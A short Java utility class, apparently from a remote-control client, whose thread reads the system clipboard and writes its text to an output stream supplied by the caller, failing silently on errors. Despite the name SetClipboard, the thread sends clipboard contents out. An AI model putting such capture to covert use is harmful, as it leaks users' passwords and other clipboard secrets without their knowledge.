package me.client.utils;

import java.awt.*;
import java.awt.datatransfer.*;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;

public class SetClipboard extends Thread{
    OutputStreamWriter writer;
    public SetClipboard(OutputStreamWriter writer) {
        this.writer = writer;
    }
    @Override
    public void run() {
        try {
            String s = getClipboard();
            writer.write(s);
            writer.flush();
        }catch (Exception e) {
        }
    }
    public static void setClipboard(String s) {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable transferable = new StringSelection(s);
        clipboard.setContents(transferable, null);
    }

    public String getClipboard() throws IOException, UnsupportedFlavorException {
        String str = "";
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable transferable = clipboard.getContents(null);
        if(transferable!=null) {
            if(transferable.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                str = (String) transferable.getTransferData(DataFlavor.stringFlavor);
            }
        }
        return str;
    }
}